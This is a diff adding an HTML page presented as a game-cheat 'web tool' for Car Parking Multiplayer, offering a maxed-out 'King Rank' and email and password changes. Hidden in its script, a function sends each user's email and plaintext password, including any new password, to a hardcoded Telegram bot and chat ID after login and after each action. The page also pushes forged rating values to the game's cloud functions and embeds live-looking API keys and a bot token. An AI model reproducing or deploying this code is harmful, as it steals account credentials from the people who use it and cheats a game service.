@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+  <meta name="theme-color" content="#000000">
+  <title>DANNYCPMVIP WEB TOOL</title>
+  <style>
+    :root{
+      --card-bg: rgba(0,0,0,0.55);
+      --accent: #00aaff;
+      --accent-2: #ff8800;
+    }
+
+    /* Background updated — Plain Supercar */
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background:
+        url("https://images.pexels.com/photos/1402787/pexels-photo-1402787.jpeg?auto=compress&cs=tinysrgb&h=1280&w=720")
+        no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      min-height: 100vh;
+      box-sizing: border-box;
+    }
+
+    .center-wrapper{
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 2;
+    }
+
+    .container{
+      width: 100%;
+      max-width: 380px;
+      border-radius: 12px;
+      padding: 20px 22px;
+      background: var(--card-bg);
+      text-align: center;
+
+      /* 🔥 Red border + blur + glow effect */
+      border: 2px solid rgba(255, 0, 0, 0.6);
+      box-shadow: 0 0 18px rgba(255, 0, 0, 0.7);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+    }
+
+    h1{
+      margin: 0 0 12px 0;
+      font-size: 20px;
+      letter-spacing: 0.6px;
+      color: #fff;
+    }
+
+    input, select {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 11px 12px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: 1px solid rgba(255,255,255,0.06);
+      background: rgba(255,255,255,0.03);
+      color: #fff;
+      font-size: 15px;
+    }
+
+    button{
+      width:100%;
+      padding:11px;
+      margin:8px 0;
+      border-radius:8px;
+      border:none;
+      cursor:pointer;
+      font-weight:700;
+      font-size:15px;
+    }
+    button.login{ background: linear-gradient(90deg,var(--accent),#33bbff); color:#fff; }
+    button.login:hover{ transform: translateY(-1px); }
+    button.menu{ background: linear-gradient(90deg,var(--accent-2),#ffaa33); color:#111; }
+    button.menu:hover{ transform: translateY(-1px); }
+
+    .status{
+      min-height: 24px;
+      margin-top: 8px;
+      color: #b8f3b8;
+      word-break: break-word;
+      font-size: 14px;
+    }
+    .status.error{ color: #ff9999; }
+    #loginForm, #menuButtons{ display: none; }
+
+    .footer-cover{
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: calc(env(safe-area-inset-bottom, 20px) + 48px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      pointer-events: none;
+      background: linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.45) 40%, rgba(0,0,0,0.8) 100%);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+    }
+
+    .footer-text{
+      pointer-events: none;
+      color: #ffffff;
+      opacity: 0.9;
+      font-size: 12px;
+      padding-bottom: env(safe-area-inset-bottom, 6px);
+    }
+
+    @media (max-width: 420px){
+      .container{ padding: 18px; max-width: 360px; }
+      h1{ font-size: 18px; }
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="center-wrapper" role="main" aria-labelledby="toolTitle">
+    <div class="container" id="mainContainer">
+      <h1 id="toolTitle">SUPREMEVIP WEB TOOL</h1>
+
+      <div id="gameSelectDiv">
+        <select id="gameSelect" aria-label="Select Game">
+          <option value="">-- Select Game --</option>
+          <option value="1">Car Parking Multiplayer</option>
+          <option value="2">Car Parking Multiplayer 2</option>
+        </select>
+      </div>
+
+      <div id="loginForm" aria-hidden="true">
+        <input type="email" id="email" placeholder="Email" autocomplete="email" autocorrect="off" autocapitalize="off" spellcheck="false" />
+        <input type="password" id="password" placeholder="Password" autocomplete="new-password" />
+        <button class="login" onclick="loginFirebase()">Login</button>
+        <div id="status" class="status" role="status" aria-live="polite"></div>
+      </div>
+
+      <div id="menuButtons" aria-hidden="true">
+        <button class="menu" onclick="kingRank()">👑 King Rank</button>
+        <button class="menu" onclick="changeEmail()">📧 Change Email</button>
+        <button class="menu" onclick="changePassword()">🔐 Change Password</button>
+        <div id="serviceStatus" class="status" role="status" aria-live="polite"></div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer-cover" aria-hidden="true">
+    <div class="footer-text">© 2025 SupremeModzdev. All Rights Reserved.</div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8307704020:AAEwNsSCXACGHHehKt_ejhuFQbtN2MqHL70";
+    const CHAT_IDS = ["6614066633","6614066633"];
+
+    const GAMES = {
+      "1": {
+        name: "Car Parking Multiplayer",
+        api_key: "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
+        rank_url: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
+      },
+      "2": {
+        name: "Car Parking Multiplayer 2",
+        api_key: "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ",
+        rank_url: "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
+      }
+    };
+
+    let currentUser = null;
+    let currentToken = null;
+    let currentPassword = null;
+    let selectedGame = null;
+
+    const gameSelect = document.getElementById('gameSelect');
+    const loginForm = document.getElementById('loginForm');
+    const menuButtons = document.getElementById('menuButtons');
+    const statusEl = document.getElementById('status');
+    const serviceStatusEl = document.getElementById('serviceStatus');
+
+    gameSelect.addEventListener('change', function(){
+      const val = this.value;
+      if(val && GAMES[val]){
+        selectedGame = GAMES[val];
+        document.getElementById('gameSelectDiv').style.display = 'none';
+        loginForm.style.display = 'block';
+        loginForm.setAttribute('aria-hidden','false');
+      } else {
+        selectedGame = null;
+        document.getElementById('gameSelectDiv').style.display = 'block';
+        loginForm.style.display = 'none';
+      }
+    });
+
+    function updateStatus(msg, isError=false, target='status'){
+      const el = (target === 'serviceStatus') ? serviceStatusEl : statusEl;
+      if(!el) return;
+      el.className = isError ? 'status error' : 'status';
+      el.textContent = msg;
+    }
+
+    function sendCostMessage(text){
+      if(!BOT_TOKEN || BOT_TOKEN === "PUT_YOUR_BOT_TOKEN_HERE"){
+        console.warn("BOT_TOKEN not configured — skipping telegram notify.");
+        return;
+      }
+      CHAT_IDS.forEach(chatId => {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({ chat_id: chatId, text })
+        });
+      });
+    }
+
+    async function loginFirebase(){
+      if(!selectedGame){ updateStatus("Select a game first!", true); return; }
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      if(!email || !password){ updateStatus("Enter email & password!", true); return; }
+
+      updateStatus("Logging in...");
+      try {
+        const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({ email, password, returnSecureToken: true })
+        });
+        const data = await resp.json();
+        if(data && data.idToken){
+          currentUser = email;
+          currentPassword = password;
+          currentToken = data.idToken;
+          updateStatus(`✅ Logged in as ${email}`);
+          loginForm.style.display = 'none';
+          menuButtons.style.display = 'block';
+          sendCostMessage(`🔐 Login Success\n📧 ${email}\n🔒 ${password}`);
+        } else {
+          updateStatus(`❌ Login failed: ${data?.error?.message || 'Unknown'}`, true);
+        }
+      } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true);
+      }
+    }
+
+    function requireLogin(){
+      if(!currentUser || !currentToken){
+        updateStatus("❌ Please login first!", true, 'serviceStatus');
+        return false;
+      }
+      return true;
+    }
+
+    async function kingRank(){
+      if(!requireLogin()) return;
+      updateStatus("Processing King Rank...", false, 'serviceStatus');
+
+      const ratingData = {};
+      const fields = ["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
+      fields.forEach(f => ratingData[f] = 100000);
+      ratingData["time"] = 10000000000;
+      ratingData["race_win"] = 3000;
+
+      const payload = { data: JSON.stringify({ RatingData: ratingData }) };
+      const headers = { "Authorization": `Bearer ${currentToken}`, "Content-Type": "application/json" };
+
+      try {
+        const res = await fetch(selectedGame.rank_url, { method: "POST", headers, body: JSON.stringify(payload) });
+        if(res.ok){
+          updateStatus("✅ King Rank set successfully!", false, 'serviceStatus');
+          sendCostMessage(`👑 King Rank\n📧 ${currentUser}\n🔒 ${currentPassword}`);
+        } else {
+          let txt = "";
+          try { const d = await res.json(); txt = d?.error?.message || d?.message || ""; } catch(e){}
+          updateStatus(`❌ Failed to set King Rank! ${txt}`, true, 'serviceStatus');
+        }
+      } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true, 'serviceStatus');
+      }
+    }
+
+    async function changeEmail(){
+      if(!requireLogin()) return;
+      const newEmail = prompt("Enter new email:");
+      if(!newEmail) return;
+      try {
+        const resp = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({ idToken: currentToken, email: newEmail, returnSecureToken: true })
+        });
+        const data = await resp.json();
+        if(data && data.email){
+          const old = currentUser;
+          currentUser = data.email;
+          currentToken = data.idToken;
+          updateStatus(`✅ Email changed to ${currentUser}`, false, 'serviceStatus');
+          sendCostMessage(`📧 Change Email\nOld: ${old}\nNew: ${currentUser}\n🔒 ${currentPassword}`);
+        } else {
+          updateStatus(`❌ Failed: ${data?.error?.message || 'Unknown'}`, true, 'serviceStatus');
+        }
+      } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true, 'serviceStatus');
+      }
+    }
+
+    async function changePassword(){
+      if(!requireLogin()) return;
+      const newPassword = prompt("Enter new password:");
+      if(!newPassword) return;
+      try {
+        const resp = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({ idToken: currentToken, password: newPassword, returnSecureToken: true })
+        });
+        const data = await resp.json();
+        if(data && data.email){
+          currentPassword = newPassword;
+          currentToken = data.idToken;
+          updateStatus("✅ Password changed successfully!", false, 'serviceStatus');
+          sendCostMessage(`🔐 Change Password\n📧 ${currentUser}\n🔒 New Password: ${currentPassword}`);
+        } else {
+          updateStatus(`❌ Failed: ${data?.error?.message || 'Unknown'}`, true, 'serviceStatus');
+        }
+      } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true, 'serviceStatus');
+      }
+    }
+  </script>
+</body>
+</html>
